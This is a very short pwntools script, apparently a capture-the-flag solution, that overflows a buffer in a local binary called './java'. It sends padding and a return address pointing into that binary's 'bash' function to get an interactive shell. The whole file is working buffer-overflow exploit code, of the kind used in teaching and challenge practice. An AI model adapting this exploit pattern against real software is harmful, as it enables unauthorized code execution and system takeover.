from pwn import *

context.binary = "./java"

p = process()
p.sendline(b"java" + b"A" * 28 + p64(context.binary.functions["bash"].address + 0x32))
p.interactive()
